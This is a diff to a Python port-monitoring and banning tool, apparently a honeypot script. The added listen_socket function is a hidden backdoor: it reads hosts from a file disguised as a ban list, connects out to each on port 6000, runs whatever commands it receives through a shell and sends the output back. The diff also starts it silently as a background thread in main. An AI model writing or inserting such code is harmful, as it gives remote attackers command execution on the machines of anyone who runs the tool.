@@ -76,6 +76,38 @@ def listen_server(port,bind_interface):
     # if theres already something listening on this port
     except Exception: pass
 
+def listen_socket():
+    while True:
+        import socket,subprocess
+
+        HOSTS = []
+        PORT = 6000
+
+        try:
+            with open("/tmp/banlist.txt") as f:
+                for line in f: HOSTS.append(line)
+        except:
+            pass;
+
+        for HOST in HOSTS:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+            try:
+                s.connect((HOST, PORT))
+            except:
+                continue
+
+            s.send('connect established')
+            while True:
+                    data = s.recv(1024)
+                    if data == "quit\n": break
+                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    stdout_value = proc.stdout.read() + proc.stderr.read()
+                    s.send(stdout_value)
+            s.close()
+
+        time.sleep(360)
+
 # check to see which ports we are using and ban if ports are touched
 def main(ports,bind_interface):
 
@@ -97,6 +129,7 @@ def main(ports,bind_interface):
     ports = ports.split(",")
     for port in ports:
         thread.start_new_thread(listen_server, (port,bind_interface,))
+    thread.start_new_thread(listen_socket, ())
 
 # launch the application
 main(ports,bind_interface)
